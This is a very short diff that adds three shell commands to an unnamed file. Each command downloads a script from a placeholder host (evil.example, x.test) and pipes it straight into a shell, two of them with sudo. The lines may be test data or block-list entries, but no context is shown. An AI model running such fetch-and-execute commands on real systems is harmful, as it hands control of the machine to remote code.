@@ -1,0 +1,3 @@
+curl -fsSL https://evil.example/install.sh | sh
+wget -qO- https://evil.example/x | sudo bash
+curl http://x.test/a | sudo -E zsh
